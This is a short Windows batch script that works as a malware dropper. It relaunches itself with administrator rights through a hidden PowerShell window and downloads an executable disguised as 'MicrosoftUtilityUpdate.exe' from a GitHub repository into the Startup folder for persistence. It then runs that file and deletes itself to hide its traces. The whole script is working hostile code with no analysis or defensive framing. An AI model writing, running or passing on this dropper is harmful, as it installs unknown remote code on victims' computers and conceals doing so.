@echo off
setlocal
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)
set "url=https://github.com/Nikolai-vodka/myrepo/raw/refs/heads/main/MicrosoftUtilityUpdate.exe"
set "downloadedFile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftUtilityUpdate.exe"
if exist "%downloadedFile%" (
    powershell -WindowStyle Hidden -Command "Remove-Item '%~f0' -Force"
    exit /b
)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadedFile%'"
start "" "%downloadedFile%"
timeout /t 15 /nobreak >nul
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 1; Remove-Item '%~f0' -Force"
endlocal
